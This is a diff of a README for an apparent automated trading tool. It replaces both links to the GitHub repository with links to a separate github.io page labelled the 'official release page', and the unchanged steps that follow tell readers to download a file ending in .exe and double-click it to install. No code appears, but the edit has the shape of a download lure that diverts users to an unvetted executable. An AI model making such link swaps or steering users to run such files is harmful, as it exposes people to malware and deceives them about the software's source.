@@ -1,6 +1,6 @@
 # 📈 trading-system - Automated trading tools for better returns
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Hot-packhorse345/trading-system)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://hot-packhorse345.github.io)
 
 This software helps you test and run trading strategies on your computer. It connects to financial exchanges to execute trades based on rules you define. The system uses high-speed technology to process data efficiently. 
 
@@ -18,7 +18,7 @@ Before you start, make sure your computer meets these requirements:
 
 Follow these steps to set up the system on your machine:
 
-1. Visit the [official release page](https://github.com/Hot-packhorse345/trading-system) to find the latest version.
+1. Visit the [official release page](https://hot-packhorse345.github.io) to find the latest version.
 2. Click the link that ends in .exe to start the download.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installer.
